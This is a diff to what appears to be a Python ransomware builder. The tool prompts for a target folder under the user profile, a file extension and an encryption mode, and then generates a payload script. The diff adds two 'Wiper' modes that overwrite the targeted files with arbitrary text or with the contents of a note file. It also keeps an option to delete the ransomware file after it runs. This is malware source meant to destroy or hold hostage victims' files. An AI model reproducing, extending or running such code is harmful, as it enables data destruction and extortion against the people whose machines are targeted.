@@ -32,7 +32,7 @@ if code_path == '3':
     code_path2 = input('Path2:')
     code_path = f"os.environ['USERPROFILE'] + '/{code_path}/{code_path2}'"
 code_1 = input('File Extension:')
-print("Fernet,Fernet_ReEncryption,base,Fernet_base,Fernet_ReEncryption_base")
+print("Fernet,Fernet_ReEncryption,base,Fernet_base,Fernet_ReEncryption_base,Wiper,Wiper_file")
 code_2 = input('Encryption:')
 
 print("Remove Ransomware File (RUN) Y or N?")
@@ -173,6 +173,19 @@ if code_2 == 'Fernet_ReEncryption_base':
      encodedBytes = base64.b32hexencode(bytes(encodedBytes))
      encodedStr = str(encodedBytes,"utf-8")'''
 
+if code_2 == 'Wiper':
+    data_wiper = input('WIPER_TEXT:')
+    loader_encrypt = 'print("WIPER FILES")'
+    code_encrypt = f'''encodedStr = str("{data_wiper}")'''
+
+if code_2 == 'Wiper_file':
+    print("Pls Enter path File Note wiper end with .txt")
+    file_name_Data_note_wiper = input("Note_Path:")
+    file_note_data_wiper = open(file_name_Data_note_wiper,'r')
+    Read_note_path_wiper = file_note_data_wiper.read()
+    file_note_data_wiper.close()
+    loader_encrypt = 'print("WIPER FILES")'
+    code_encrypt = f'''encodedStr = str("{Read_note_path_wiper}")'''
 
 file_code = f"""
 import os
